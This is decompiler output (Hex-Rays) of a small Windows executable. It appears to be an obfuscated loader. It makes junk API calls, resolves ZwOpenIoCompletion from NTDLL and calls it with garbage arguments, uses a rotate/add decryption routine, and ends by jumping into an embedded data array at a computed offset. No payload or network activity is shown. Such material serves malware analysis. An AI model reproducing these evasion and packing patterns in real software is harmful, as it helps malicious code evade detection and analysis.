/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
_DWORD *__stdcall sub_4011A8(_DWORD *, unsigned int, int);

//-------------------------------------------------------------------------
// Data declarations

int dword_4010F4[8] =
{
  821040639,
  1787822145,
  18900992,
  57147392,
  1778384896,
  26624,
  6815744,
  1749024768
}; // weak
// extern UINT (__stdcall *GetACP)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *GetCurrentProcessId)();
CHAR FileName[] = ".VRq"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
CHAR aG5tadm7rvpc5r2[] = "g5Tadm7RvpC5r2vbgSfJPdd.O8o"; // idb
CHAR ProcName[] = "ZwOpenIoCompletion"; // idb


//----- (0040100A) --------------------------------------------------------
int start()
{
  HANDLE FileA; // eax
  int v2; // [esp+0h] [ebp-24h]
  FARPROC ZwOpenIoCompletion; // [esp+4h] [ebp-20h]
  int v4; // [esp+8h] [ebp-1Ch]
  int v5; // [esp+Ch] [ebp-18h]
  int v6; // [esp+Ch] [ebp-18h]
  int v7; // [esp+10h] [ebp-14h]
  LPSTR CommandLineA; // [esp+14h] [ebp-10h]
  int v9; // [esp+18h] [ebp-Ch]
  HMODULE hModule; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h]

  GetCommandLineW();
  hModule = GetModuleHandleA(ModuleName);
  GetCurrentThreadId();
  GetCurrentThreadId();
  GetACP();
  ZwOpenIoCompletion = GetProcAddress(hModule, ProcName);
  CommandLineA = GetCommandLineA();
  GetCurrentProcessId();
  GetFileSize(hModule, 0);
  FileA = CreateFileA(FileName, 0xA0000000, 1u, 0, 3u, 5u, 0);
  ((void (__stdcall *)(_DWORD, _DWORD, _DWORD, int, FARPROC, int, int, int, LPSTR, int, HANDLE, HMODULE, int))ZwOpenIoCompletion)(
    0,
    0,
    0,
    v2,
    ZwOpenIoCompletion,
    v4,
    v5,
    v7,
    CommandLineA,
    v9,
    FileA,
    hModule,
    savedregs);
  CreateFileA(aG5tadm7rvpc5r2, 0xA0000000, 7u, 0, 3u, 0x84u, 0);
  return ((int (*)(void))((char *)dword_4010F4 + (v6 ^ 0xC0000005)))();
}
// 40109F: variable 'v2' is possibly undefined
// 40109F: variable 'v4' is possibly undefined
// 40109F: variable 'v5' is possibly undefined
// 40109F: variable 'v7' is possibly undefined
// 40109F: variable 'v9' is possibly undefined
// 40109F: variable 'savedregs' is possibly undefined
// 4010DA: variable 'v6' is possibly undefined
// 4010F4: using guessed type int dword_4010F4[8];

//----- (004011A8) --------------------------------------------------------
_DWORD *__stdcall sub_4011A8(_DWORD *a1, unsigned int a2, int a3)
{
  _DWORD *result; // eax
  unsigned int v4; // ecx

  result = a1;
  v4 = a2 >> 2;
  do
  {
    *result += a3;
    *result = __ROL4__(*result, 121);
    *result = __ROR4__(*result, 44);
    *result -= 800522116;
    *result = __ROR4__(*result, 183);
    *result += a3;
    *result++ += 1882266321;
    --v4;
  }
  while ( v4 );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
